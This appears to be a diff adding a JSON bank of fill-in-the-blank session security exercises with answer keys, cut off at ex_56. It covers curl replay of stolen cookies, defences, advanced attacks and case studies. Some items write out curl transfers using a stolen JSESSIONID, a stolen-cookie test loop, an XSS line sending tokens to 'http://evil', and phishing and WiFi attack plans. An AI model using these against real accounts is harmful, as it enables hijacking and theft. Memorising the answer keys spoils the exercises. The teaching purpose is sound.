+          "starter_code": "// TODO: Complete the command:\n// curl -X ___ http://localhost:15000/transfer \\\n//   -H 'Content-Type: ___' \\\n//   -d '___' \\\n//   --cookie '___'",
+          "expected_output": "POST / application/x-www-form-urlencoded / to=999999&transferAmount=500 / JSESSIONID=node0abc123",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: POST / application/x-www-form-urlencoded / to=999999&transferAmount=500 / JSESSIONID=node0abc123"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: curl with User-Agent Spoofing",
+          "description": "Make curl look like a real browser.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: Add a fake User-Agent:\n// curl http://bank.com/account \\\n//   --cookie 'JSESSIONID=abc' \\\n//   -H 'User-Agent: ___'",
+          "expected_output": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Sa"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Verify Hijacking Worked",
+          "description": "Confirm you're seeing the victim's data.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: After curl, how do you verify?\n// Step 1: Check response for ___\n// Step 2: Compare with your own account ___\n// Step 3: The username should show ___",
+          "expected_output": "victim's username and balance / they should be different / the victim's name, not yours",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: victim's username and balance / they should be different / the victim's name, not yours"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: curl with Verbose Output",
+          "description": "Use -v flag to see full request/response headers.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: What flag shows full headers?\n// curl ___ http://bank.com/account --cookie 'JSESSIONID=abc'\n// Look for: ___ in the response",
+          "expected_output": "-v / Set-Cookie, Content-Type, and the session validation response",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: -v / Set-Cookie, Content-Type, and the session validation response"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Automate Multiple Replays",
+          "description": "Write a bash script to test multiple stolen cookies.",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the script:\n// for cookie in 'node0aaa' 'node0bbb' 'node0ccc'; do\n//   echo \"Testing $cookie\"\n//   curl -s http://bank.com/account \\\n//     --cookie \"JSESSIONID=___\" | grep '___'\n// done",
+          "expected_output": "$cookie / Welcome (to extract the username for each session)",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: $cookie / Welcome (to extract the username for each session)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Detect Expired Sessions",
+          "description": "What happens when you replay an expired cookie?",
+          "difficulty": "intermediate",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: If the session expired, curl returns:\n// Response code: ___\n// Redirects to: ___\n// This means: ___",
+          "expected_output": "302 / /login (or /welcome) / the session no longer exists on the server",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 302 / /login (or /welcome) / the session no longer exists on the server"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: curl vs Browser Replay",
+          "description": "Compare using curl vs editing cookies in browser.",
+          "difficulty": "advanced",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// Method 1: curl --cookie 'JSESSIONID=stolen'\n// Method 2: F12 → Storage → edit cookie value\n// TODO: Advantages of curl: ___\n// Advantages of browser: ___",
+          "expected_output": "curl: scriptable, no browser needed, faster. Browser: renders full page, can interact with JS, more realistic.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: curl: scriptable, no browser needed, faster. Browser: renders full page, can interact with JS, more "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Replay with Follow Redirects",
+          "description": "Handle 302 redirects in curl.",
+          "difficulty": "advanced",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// Transfer returns 302 redirect. To follow it:\n// curl -X POST http://bank.com/transfer \\\n//   -d 'to=999999&amount=500' \\\n//   --cookie 'JSESSIONID=abc' \\\n//   ___\n// What flag follows redirects?",
+          "expected_output": "-L (or --location) — follows 302 redirects automatically",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: -L (or --location) — follows 302 redirects automatically"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Extract Data from curl Response",
+          "description": "Parse the HTML response to find balance.",
+          "difficulty": "advanced",
+          "category": "curl Replay Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to curl Replay Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: Extract balance from curl output:\n// curl -s http://bank.com/account --cookie 'JSESSIONID=abc' \\\n//   | grep -o '___'\n// What regex pattern matches a dollar amount?",
+          "expected_output": "grep -o '[0-9]* \\$' or grep -o 'Balance.*\\$' — extracts the balance amount from the HTML",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: grep -o '[0-9]* \\$' or grep -o 'Balance.*\\$' — extracts the balance amount from the HTML"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Set HttpOnly Flag",
+          "description": "Add HttpOnly to a session cookie.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Fix this vulnerable code:\nCookie c = new Cookie(\"JSESSIONID\", id);\n// Add the missing line:\n___\nresponse.addCookie(c);",
+          "expected_output": "c.setHttpOnly(true);",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: c.setHttpOnly(true);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Set Secure Flag",
+          "description": "Ensure cookie only travels over HTTPS.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO:\nCookie c = new Cookie(\"JSESSIONID\", id);\nc.setHttpOnly(true);\n___\nresponse.addCookie(c);",
+          "expected_output": "c.setSecure(true);",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: c.setSecure(true);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Set SameSite via Header",
+          "description": "Use Set-Cookie header for full control.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the header:\nresponse.setHeader(\"Set-Cookie\",\n    \"JSESSIONID=\" + id +\n    \"; ___; ___; ___; Path=/\");",
+          "expected_output": "HttpOnly; Secure; SameSite=Strict",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: HttpOnly; Secure; SameSite=Strict"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Session Timeout",
+          "description": "Configure 30-minute session expiry.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Set timeout in code:\nHttpSession session = request.getSession();\nsession.setMaxInactiveInterval(___); // 30 minutes\n\n// TODO: Set in web.xml:\n// <session-config>\n//   <session-timeout>___</session-timeout>\n// </session-config>",
+          "expected_output": "1800 (seconds) / 30 (minutes)",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 1800 (seconds) / 30 (minutes)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Regenerate on Login",
+          "description": "Prevent session fixation.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Add regeneration:\nif (authenticate(user, pass)) {\n    request.getSession().___; // Kill old session\n    HttpSession s = request.getSession(___); // Create new\n    s.setAttribute(\"user\", user);\n}",
+          "expected_output": "invalidate() / true",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: invalidate() / true"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Proper Logout",
+          "description": "Implement complete session destruction.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete logout handler:\nprotected void doGet(...) {\n    HttpSession s = req.getSession(false);\n    if (s != null) s.___;\n    Cookie c = new Cookie(\"JSESSIONID\", \"\");\n    c.setMaxAge(___);\n    c.setPath(\"___\");\n    resp.addCookie(c);\n    resp.sendRedirect(\"/login\");\n}",
+          "expected_output": "invalidate() / 0 / /",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: invalidate() / 0 / /"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: HSTS Header",
+          "description": "Force HTTPS with Strict-Transport-Security.",
+          "difficulty": "intermediate",
+          "category": "Session Defence",
+          "estimated_minutes": 7,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Set the HSTS header:\nresponse.setHeader(\"___\",\n    \"max-age=___; includeSubDomains\");\n// What does max-age=31536000 mean? ___",
+          "expected_output": "Strict-Transport-Security / 31536000 / Browser remembers to use HTTPS for 1 year",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Strict-Transport-Security / 31536000 / Browser remembers to use HTTPS for 1 year"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: IP Binding Filter",
+          "description": "Detect session use from different IPs.",
+          "difficulty": "advanced",
+          "category": "Session Defence",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the filter:\nString currentIP = req.___();\nString savedIP = (String) session.getAttribute(\"___\");\nif (savedIP != null && !savedIP.___(currentIP)) {\n    session.invalidate();\n}\nsession.setAttribute(\"ip\", ___);",
+          "expected_output": "getRemoteAddr / ip / equals / currentIP",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: getRemoteAddr / ip / equals / currentIP"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: Concurrent Session Limit",
+          "description": "Allow only one active session per user.",
+          "difficulty": "advanced",
+          "category": "Session Defence",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: When user logs in:\n// 1. Check if user already has an active session: ___\n// 2. If yes, invalidate the OLD session: ___\n// 3. Create new session: ___\n// Why: prevents attacker from using stolen cookie\n//       while victim is also logged in",
+          "expected_output": "Check session store for existing session with same username / call invalidate() on old session / getSession(true) and set user attribute",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Check session store for existing session with same username / call invalidate() on old session / get"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Full Security Audit",
+          "description": "Write a checklist for session security.",
+          "difficulty": "advanced",
+          "category": "Session Defence",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Session Defence! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the audit:\n// [ ] HttpOnly flag: ___\n// [ ] Secure flag: ___\n// [ ] SameSite: ___\n// [ ] Session timeout: ___\n// [ ] Regeneration on login: ___\n// [ ] Proper logout: ___\n// [ ] HSTS header: ___",
+          "expected_output": "Check each is set correctly. HttpOnly=true, Secure=true, SameSite=Strict, Timeout≤30min, Regenerate=yes, Logout invalidates, HSTS present.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Check each is set correctly. HttpOnly=true, Secure=true, SameSite=Strict, Timeout≤30min, Regenerate="
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Session Prediction",
+          "description": "Guess valid session IDs from patterns.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Server generates sequential IDs:\n// Session 1: SID=1000\n// Session 2: SID=1001\n// Session 3: SID=1002\n// TODO: What's session 4? ___\n// How to fix: ___",
+          "expected_output": "SID=1003 — predictable! Fix: use cryptographically random IDs (SecureRandom, UUID)",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: SID=1003 — predictable! Fix: use cryptographically random IDs (SecureRandom, UUID)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Cookie Tossing",
+          "description": "Exploit subdomain cookies to override session.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Parent domain sets: JSESSIONID=real; Domain=.bank.com\n// Attacker controls evil.bank.com and sets:\n// JSESSIONID=evil; Domain=.bank.com\n// TODO: Which cookie does the browser send to bank.com? ___\n// Why is this dangerous? ___",
+          "expected_output": "Both! The browser sends both cookies. The server may use the attacker's value, enabling session fixation. Defence: don't allow user-controlled subdomains.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Both! The browser sends both cookies. The server may use the attacker's value, enabling session fixa"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: JWT Session Hijacking",
+          "description": "Steal and replay a JWT token.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// JWT stored in localStorage (common mistake):\n// localStorage.getItem('token') = 'eyJhbG...'\n// TODO: XSS can steal this with:\n// ___\n// How is this different from cookie theft? ___",
+          "expected_output": "new Image().src = 'http://evil/?t=' + localStorage.getItem('token') / JWTs in localStorage are ALWAYS accessible to JS — no HttpOnly equivalent. Must use HttpOnly cookies for JWT storage.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: new Image().src = 'http://evil/?t=' + localStorage.getItem('token') / JWTs in localStorage are ALWAY"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: Session Puzzling",
+          "description": "Exploit shared session variables.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Admin login sets: session['role'] = 'admin'\n// Password reset sets: session['authenticated'] = true\n// TODO: What happens if:\n// 1. Attacker starts password reset → authenticated = true\n// 2. Navigates to admin panel\n// 3. Server checks session['authenticated'] but not session['role']\n// Result: ___",
+          "expected_output": "Attacker accesses admin panel without admin credentials! Different features share session state but check different variables. Defence: use specific session attributes per feature.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Attacker accesses admin panel without admin credentials! Different features share session state but "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Cross-Site Cookie Attacks",
+          "description": "Exploit SameSite=None cookies.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Server sets: SameSite=None; Secure\n// TODO: Can a CSRF attack use this cookie? ___\n// Can a third-party site read this cookie? ___\n// When is SameSite=None appropriate? ___",
+          "expected_output": "Yes — SameSite=None means cookie is sent with ALL cross-site requests. Can't read directly but can make authenticated requests. Only appropriate for third-party integrations (e.g., embedded payment widgets).",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Yes — SameSite=None means cookie is sent with ALL cross-site requests. Can't read directly but can m"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Subdomain Session Leakage",
+          "description": "Exploit overly broad cookie domains.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Cookie set with: Domain=.example.com\n// TODO: Which sites receive this cookie?\n// app.example.com → ___\n// blog.example.com → ___\n// evil.example.com → ___\n// Defence: ___",
+          "expected_output": "All three receive the cookie! If an attacker compromises any subdomain, they get session cookies for the main app. Defence: set domain strictly (no leading dot) or use separate domains for untrusted content.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: All three receive the cookie! If an attacker compromises any subdomain, they get session cookies for"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Race Condition in Session",
+          "description": "Exploit concurrent requests during login.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Attacker sends 100 simultaneous login requests.\n// Each request creates a new session before old one is invalidated.\n// TODO: What vulnerability does this exploit? ___\n// Possible result: ___\n// Defence: ___",
+          "expected_output": "Time-of-check to time-of-use (TOCTOU) race condition. Could create multiple valid sessions for same user. Defence: atomic session operations, locks on session creation.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Time-of-check to time-of-use (TOCTOU) race condition. Could create multiple valid sessions for same "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Encrypted Session IDs",
+          "description": "Design a session ID that's tamper-evident.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// Instead of random IDs, server creates:\n// sessionId = AES_encrypt(userId + timestamp + random, serverKey)\n// TODO: Why is this better than just random? ___\n// Can the client modify it? ___\n// Can the server validate without database lookup? ___",
+          "expected_output": "Contains structured data (user, time). Client can't modify without the key. Server can decrypt and validate without database — like a signed JWT but in a cookie.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Contains structured data (user, time). Client can't modify without the key. Server can decrypt and v"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Session Token Rotation",
+          "description": "Rotate session IDs during a session.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: Complete the rotation logic:\n// Every ___ minutes, create a new session ID\n// Transfer all session data to new session\n// Invalidate old session\n// Why: even if attacker stole a cookie 10 min ago,\n// it's now ___",
+          "expected_output": "15 minutes (configurable) / invalid (expired/replaced). Rotation limits the window of opportunity for replay attacks.",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 15 minutes (configurable) / invalid (expired/replaced). Rotation limits the window of opportunity fo"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Design a Secure Session System",
+          "description": "Combine all defences into one design.",
+          "difficulty": "advanced",
+          "category": "Advanced Session Attacks",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Advanced Session Attacks! Let's build your session security skills.",
+          "starter_code": "// TODO: Design a complete session system:\n// Cookie flags: ___\n// Session timeout: ___ minutes\n// Regeneration events: ___\n// Concurrent sessions: ___\n// Detection: ___\n// Storage: ___",
+          "expected_output": "HttpOnly, Secure, SameSite=Strict / 30 / login, password change, privilege escalation / max 1 per user / IP + User-Agent binding / server-side only (not in cookie)",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: HttpOnly, Secure, SameSite=Strict / 30 / login, password change, privilege escalation / max 1 per us"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Firesheep Analysis",
+          "description": "Analyse the 2010 WiFi session hijacking tool.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// Tool name: ___\n// Year: ___\n// What it did: ___\n// Why it worked: ___\n// What fixed it: ___",
+          "expected_output": "Firesheep / 2010 / Captured session cookies on public WiFi / Sessions sent over HTTP (no Secure flag) / HTTPS everywhere + Secure cookies",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Firesheep / 2010 / Captured session cookies on public WiFi / Sessions sent over HTTP (no Secure flag"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: GitHub Session Fixation",
+          "description": "Analyse the 2013 GitHub vulnerability.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// Year: ___\n// Type: Session ___\n// How: attacker could ___\n// Impact: ___\n// Fix: ___",
+          "expected_output": "2013 / Fixation / set a known session ID via crafted URL / access victim's repositories / regenerate session ID on login",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: 2013 / Fixation / set a known session ID via crafted URL / access victim's repositories / regenerate"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Slack Token Theft 2022",
+          "description": "Analyse the Slack compromise.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO:\n// What was stolen: ___\n// How it was stolen: ___\n// Impact: ___\n// Defence that was missing: ___",
+          "expected_output": "Employee session tokens / compromised employee credentials / access to private channels and repos / token rotation, IP binding, anomaly detection",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Employee session tokens / compromised employee credentials / access to private channels and repos / "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: Design a Phishing + Session Attack",
+          "description": "Plan a theoretical combined attack.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// TODO: Design a phishing email that leads to session theft:\n// Step 1: Email content: ___\n// Step 2: Landing page does: ___\n// Step 3: Captured data: ___\n// Defence: ___",
+          "expected_output": "Fake bank alert with login link → Landing page looks like real bank, captures credentials AND session → Has both password and cookie → 2FA would prevent account access even with stolen session",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: Fake bank alert with login link → Landing page looks like real bank, captures credentials AND sessio"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Hotel WiFi Attack Scenario",
+          "description": "Design a hotel WiFi session attack.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
+          "starter_code": "// Scenario: attacker on hotel WiFi\n// TODO: Attack steps:\n// 1. Set up: ___\n// 2. Capture: ___\n// 3. Replay: ___\n// What makes hotel WiFi dangerous: ___",
+          "expected_output": "ARP spoofing or packet capture / HTTP session cookies (no Secure flag) / curl with stolen cookies / shared network, victims on same LAN, HTTP traffic visible to all",
+          "hints": [
+            {
+              "message": "Read the TODO comments — they tell you exactly what to fill in."
+            },
+            {
+              "message": "Think about how sessions work: cookie sent → server looks up → identity confirmed."
+            },
+            {
+              "message": "Answer: ARP spoofing or packet capture / HTTP session cookies (no Secure flag) / curl with stolen cookies / "
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Mobile App Session Issues",
+          "description": "Analyse mobile-specific session vulnerabilities.",
+          "difficulty": "advanced",
+          "category": "Real-World Case Studies",
+          "estimated_minutes": 10,
+          "ai_intro": "Welcome to Real-World Case Studies! Let's build your session security skills.",
